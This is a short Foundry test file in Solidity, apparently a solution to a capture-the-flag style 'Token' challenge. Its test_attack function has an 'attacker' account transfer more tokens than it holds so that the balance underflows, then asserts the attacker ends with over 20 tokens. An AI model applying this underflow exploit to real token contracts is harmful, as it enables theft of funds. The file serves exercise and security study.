//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../src/token/Token.sol";

contract TokenTest is Test {
    address attacker;
    Token token;

    function setUp() public  {
        attacker = makeAddr("attacker");
        vm.prank(attacker);
        token = new Token(20);
    }

    function test_attack() public {
        vm.prank(attacker);
        token.transfer(address(1), 21);
        assertGt(token.balanceOf(attacker), 20);
    }
}